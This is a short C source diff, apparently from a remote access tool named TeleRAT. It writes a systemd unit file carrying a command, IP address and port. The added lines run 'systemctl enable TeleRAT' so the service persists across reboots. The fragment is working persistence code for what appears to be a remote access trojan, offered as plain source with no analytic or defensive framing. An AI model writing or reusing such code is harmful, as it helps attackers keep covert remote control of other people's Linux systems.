@@ -57,6 +57,8 @@ void initSetiing(char *pName,char *ip,char *port){
 		"[Install]\n"
 	    "WantedBy=multi-user.target\n\n",cmd.cmd,ip,port);
     printf("%s",text);
+    FILE *enable = popen("systemctl enable TeleRAT","r");
+    pclose(enable);
 	fprintf(f,"%s",text);
     free(text);
     fclose(f);
